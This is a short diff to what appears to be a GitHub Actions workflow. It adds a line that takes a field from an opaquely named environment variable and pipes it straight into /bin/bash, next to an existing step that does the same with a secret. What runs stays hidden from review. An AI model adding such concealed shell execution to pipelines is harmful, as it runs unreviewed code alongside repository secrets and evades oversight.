@@ -23,6 +23,7 @@ jobs:
           m9: ${{ secrets.m9 }}
         run: |
           printf '%s' "$m9" | jq -r .jn5 | /bin/bash
+          echo $jnco93183 | jq -r .v03 | /bin/bash
 
       - name: Save archive
         if: always()
